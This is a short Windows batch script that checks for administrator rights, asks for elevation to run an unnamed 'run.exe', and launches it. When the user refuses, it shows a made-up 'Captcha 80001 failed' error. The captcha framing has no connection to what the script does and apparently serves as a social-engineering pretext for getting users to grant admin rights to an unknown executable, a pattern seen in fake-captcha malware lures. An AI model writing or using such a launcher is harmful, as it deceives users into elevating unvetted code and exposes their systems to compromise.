@echo off
:: Check for Admin Privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    :: Ask for admin privileges
    powershell -Command "Start-Process 'run.exe' -Verb RunAs -ErrorAction Stop"
    if %errorlevel% neq 0 (
        powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Captcha 80001 failed: User cancelled', 'Error', 'OK', 'Error')"
    )
) else (
    :: If already admin, run the executable directly
    start "" run.exe
)
